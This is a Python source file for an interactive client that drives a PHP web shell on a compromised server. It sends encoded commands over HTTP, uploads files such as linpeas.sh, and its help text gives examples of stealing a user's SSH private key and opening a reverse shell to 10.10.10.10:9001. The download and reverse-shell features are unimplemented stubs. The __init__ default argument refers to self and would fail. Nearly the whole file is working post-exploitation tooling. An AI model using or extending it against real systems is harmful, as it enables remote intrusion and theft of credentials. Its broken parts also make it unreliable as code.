from php_shell_interactor import web_utils
import sys
from base64 import b64encode, b64decode
import binascii
import os
import argparse

basepath = os.path.dirname(os.path.abspath(__file__))


class PHP_Web_Shell_Handler:
    DEFAULT_WEBSHELL_PARAM = "phpshellcmd"
    DEFAULT_OS = "UNIX"

    UPLOAD_HELP = "\n\t[ UPLOAD ] - 'upload localfilepath remotefilepath' - uploads a file to the server, from 'localfilepath' on your machine, to 'remotefilepath' on the remote machine\n" + "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh"
    DOWNLOAD_HELP = "\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" + "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa"
    SWITCHSHELL_HELP = "\n\t[ SWITCHSHELL ] - ' new_shellfile' - switches the file currently used by the shell handler to a new file (often used for switching between encoded and non encoded shells)\n" + "\tEXAMPLE: switchshell /path/to/newshell.php"
    SHELL_HELP = "\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" + "\tEXAMPLE: shell 10.10.10.10 9001"
    QUIT_HELP = "\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n"

    def __init__(self, webshell_url, webshell_param=None, encoded=True, os=self.DEFAULT_OS):
        try:
            webshell_url = web_utils.validate_url(webshell_url)
            if '/' not in webshell_url or not webshell_url.endswith('.php'):
                raise web_utils.InvalidRequestError("NO FILE TO PHP FILE FOUND")
        except web_utils.InvalidRequestError:
            print(f"[-] - The provided url: '{webshell_url}'' does not seem to be a valid url with a php file endpoint")
            sys.exit(0)

        if not web_utils.connection_check(webshell_url):
            sys.exit(1)

        self.webshell_url = webshell_url
        if not webshell_param:
            webshell_param = self.DEFAULT_WEBSHELL_PARAM
        self.webshell_param = webshell_param
        self.encoded = encoded
        if os.upper() != "WINDOWS" and os.upper() != "UNIX":
            print("[-] - The provided OS is not UNIX or WINDOWS... Defaulting to UNIX")
            self.os = self.DEFAULT_OS
        else:
            self.os = os            

    def _encode_cmd(self, cmd):
        encoded_cmd = b64encode(cmd.encode()).decode()
        return encoded_cmd

    def _decode_result(self, result):
        try:
            decoded_result = b64decode(result.encode()).decode()
        except binascii.Error:
            return f"[-] - Result was not valid base64 and therefore could not be decoded...\nRESULT:\n{result}"

        return decoded_result

    def exec_cmd(self, cmd):
        if self.encoded:
            cmd = self._encode_cmd(cmd)
        if len(cmd) < 2048:
            request_url = self.webshell_url + "?" + self.webshell_param + "=" + cmd
            result = web_utils.make_request(request_url, timeout=30).text
        else:
            post_data = {self.webshell_param: cmd}
            result = web_utils.make_request(self.webshell_url, method="POST", post_data=post_data, timeout=30).text

        if self.encoded:
            return self._decode_result(result)

        return result

    def upload_file_to_server(self, cmd):
        cmd_args = cmd.split(" ")
        if len(cmd_args) != 3:
            self.show_help("HELP UPLOAD")
            return
        local_filepath = cmd_args[1]
        remote_filepath = cmd_args[2]

        if not os.path.exists(local_filepath):
            print(f"[-] - {local_filepath} does not exist, so cannot be uploaded...")
            return

        file_contents = None
        try:
            with open(local_filepath, 'r') as f:
                file_contents = f.read()
        except IOError:
            print(f"[-] - {local_filepath} is not accessible, so cannot be uploaded...")
            return

        if file_contents:
            encoded_file_contents = b64encode(file_contents.encode()).decode()
            upload_command = f"echo {encoded_file_contents} | base64 -d > {remote_filepath}"
            self.exec_cmd(upload_command)

            check_upload_cmd = f"cat {remote_filepath}"
            
            if file_contents in self.exec_cmd(check_upload_cmd):
                print(f"[+] - '{local_filepath}'' UPLOADED TO '{remote_filepath}'' ON THE REMOTE SERVER!")
            else:
                print(f"[?] - '{local_filepath}'' MAY BE UPLOADED to '{remote_filepath}'' ON THE REMOTE SERVER... RUN 'cat {remote_filepath}' TO VALIDATE (AUTO CHECKING FAILED)")

    def download_file_from_server(self, cmd):
        cmd_args = cmd.split(" ")
        if len(cmd_args) != 3:
            self.show_help("HELP DOWNLOAD")
            return
        remote_filepath = cmd_args[1]
        local_filepath = cmd_args[2]
        print("SORRY - THIS IS NOT YET IMPLEMENTED... TRY A 'git pull' in the install directory of this tool and it may be done?")

    def switch_webshell(self, cmd):
        cmd_args = cmd.split(" ")
        if len(cmd_args) != 2:
            self.show_help("HELP SWITCHSHELL")
            return 
        new_shell_path = cmd_args[1]
        print("SORRY - THIS IS NOT YET IMPLEMENTED... TRY A 'git pull' in the install directory of this tool and it may be done?")

    def catch_reverse_shell(self, cmd):
        cmd_args = cmd.split(" ")
        if len(cmd_args) != 3:
            self.show_help("HELP SHELL")
            return
        listening_ip = cmd_args[1]
        listening_port = cmd_args[2]
        print("SORRY - THIS IS NOT YET IMPLEMENTED... TRY A 'git pull' in the install directory of this tool and it may be done?")

    # add file remove command?                                                                                                              

    def show_help(self, cmd):
        print("[*] - COMMAND HELP:")
        if cmd.upper() == "HELP UPLOAD":
            output = self.UPLOAD_HELP

        elif cmd.upper() == "HELP DOWNLOAD":
            output = self.DOWNLOAD_HELP

        elif cmd.upper() == "HELP SWITCHSHELL":
            output = self.SWITCHSHELL_HELP

        elif cmd.upper() == "HELP SHELL":
            output = self.SHELL_HELP

        elif cmd.upper() == "HELP EXIT" or cmd.upper() == "HELP QUIT":
            output = self.QUIT_HELP

        else:
            output = self.UPLOAD_HELP + self.DOWNLOAD_HELP + self.SWITCHSHELL_HELP + self.SHELL_HELP + self.QUIT_HELP

        print(output)

    def shell(self):
        shell_filename = basepath +"/phpshells/shell.php"
        if self.encoded:
           shell_filename = basepath + "/phpshells/encoded_shell.php" 

        with open(shell_filename, "r") as f:
            print("[!] - Upload a shell with this php inside to use this shell handler - [!]:\n\n")
            print(f.read() + "\n")

        shell_banner = self.webshell_url.split("/")[-1].split('.')[0] + "@" + self.webshell_url.split("/")[-2]

        while True:
            cmd = input(f"[ {shell_banner} ] > ")
            if not cmd:
                continue

            elif cmd.upper().startswith("UPLOAD"):
                self.upload_file_to_server(cmd)

            elif cmd.upper().startswith("DOWNLOAD"):
                self.download_file_from_server(cmd)

            elif cmd.upper().startswith("SWITCHSHELL"):
                self.switch_webshell(cmd)

            elif cmd.upper().startswith("SHELL"):
                self.catch_reverse_shell(cmd)

            elif cmd.upper() == ("HELP"):
                self.show_help(cmd)

            elif cmd.upper() == "QUIT" or cmd.upper() == "EXIT":
                sys.exit(1)

            else:
                print(self.exec_cmd(cmd))